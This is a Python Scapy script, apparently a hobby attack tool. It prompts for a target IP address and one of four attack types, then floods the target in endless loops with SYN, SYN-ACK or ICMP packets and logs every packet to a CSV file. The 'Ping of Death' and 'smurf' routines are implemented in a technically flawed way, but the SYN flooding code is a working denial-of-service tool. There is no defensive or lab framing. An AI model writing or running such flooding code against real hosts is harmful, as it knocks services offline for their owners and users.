from scapy.all import IP, ICMP, TCP, Raw, send, conf
import random
from datetime import datetime
import csv
import ipaddress
import signal
import sys

# Disable Scapy output messages
conf.verb = 0

def log_attack(attack_type, src_ip, target_ip, src_port, target_port):
    # Open the CSV file in append mode and log the attack details
    with open('attack_log.csv', mode='a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([datetime.now(), attack_type, src_ip, target_ip, src_port, target_port])

def ddos(target_ip, attack_type):
    target_port = 12345  # Target port
    
    print(f"\nAttacking this IP address: {target_ip} with {attack_type} attack...\n")
    
    try:
        if attack_type == "syn_flood":
            while True:
                src_port = random.randint(1024, 65535)
                pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
                send(pkt)
                log_attack("SYN Flood", pkt.src if pkt.src else "Unknown", target_ip, src_port, target_port)

        elif attack_type == "pod":
            while True:
                load = 6000  # Load for the Ping of Death attack
                pkt = IP(dst=target_ip) / ICMP() / Raw(load=load)
                send(pkt)
                log_attack("Ping of Death", pkt.src if pkt.src else "Unknown", target_ip, 0, target_port)

        elif attack_type == "syn_ack":
            while True:
                src_port = random.randint(1024, 65535)
                pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
                send(pkt)
                log_attack("SYN-ACK Attack", pkt.src if pkt.src else "Unknown", target_ip, src_port, target_port)

        elif attack_type == "smurf":
            while True:
                pkt = IP(src=target_ip, dst=target_ip) / ICMP()
                send(pkt)
                log_attack("Smurf Attack", pkt.src if pkt.src else "Unknown", target_ip, 0, target_port)

    except KeyboardInterrupt:
        print("\nAttack stopped by user (Ctrl + C).")
        sys.exit(0)  # Ensures a clean exit

# Handle Ctrl + C to stop the attack properly
def signal_handler(sig, frame):
    print("\nInterrupt received, stopping the attack...")
    sys.exit(0)

# Bind Ctrl + C to the signal handler
signal.signal(signal.SIGINT, signal_handler)

# Ask the user for the target IP address and the attack type
while True:
    target_ip = input("Enter the target IP address: ")
    try:
        # Validate the IP address
        ipaddress.ip_address(target_ip)  # Raises an exception if the IP is invalid
        break  # Exit the loop if the IP address is valid
    except ValueError:
        print("Invalid IP address. Please enter a valid IP address.")

# List of valid attack types
valid_attack_types = ['syn_flood', 'pod', 'syn_ack', 'smurf']
while True:
    attack_type = input("Enter the attack type (syn_flood, pod, syn_ack, smurf): ")
    if attack_type in valid_attack_types:
        break  # Exit the loop if the attack type is valid
    else:
        print("Invalid attack type. Please enter a valid attack type.")

# Start the DDoS attack
ddos(target_ip, attack_type)
